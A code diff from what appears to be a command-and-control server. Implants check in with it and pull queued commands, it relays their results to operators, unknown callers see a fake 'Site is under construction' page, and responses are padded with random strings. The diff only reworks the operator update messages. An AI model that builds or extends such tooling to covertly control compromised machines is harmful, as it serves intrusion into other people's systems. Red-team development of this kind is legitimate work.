@@ -61,9 +61,9 @@ def build_operator_update(update_type: server_codes.ServerUpdates, data) -> Dict
         case server_codes.ServerUpdates.NEW_IMPLANT:
             # data must be the Implant object
             return {"update_type": update_type.value, "update_data": data.__dict__}
-        case server_codes.ServerUpdates.NEW_COMMAND_RESPONSE:
-            # data must be the cmd_id
-            return {}
+        case server_codes.ServerUpdates.IMPLANT_CHECKIN:
+            # data is just the name of the implant that checked in
+            return {"update_type": update_type.value, "update_data": data}
         case _:
             return {}
 
@@ -128,6 +128,9 @@ def implant_command():
     
     if implant_name not in implant_db.dict:
         return "Site is under construction"
+
+    # Update the operators
+    #update_operators(server_codes.ServerUpdates.IMPLANT_CHECKIN,implant_name)
     
     if len(implant_db.dict[implant_name].command_queue) > 0:
         new_cmd = implant_db.dict[implant_name].pop_command()
@@ -183,7 +186,6 @@ def implant_response():
     op = commandlog_db.dict[ID].operator
     data = {"update_type": "NEW_COMMAND_RESPONSE", "update_data": r}
     resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)
-
     
     ret = make_response(encryption.id_generator(random.randint(200,350)))
     return ret
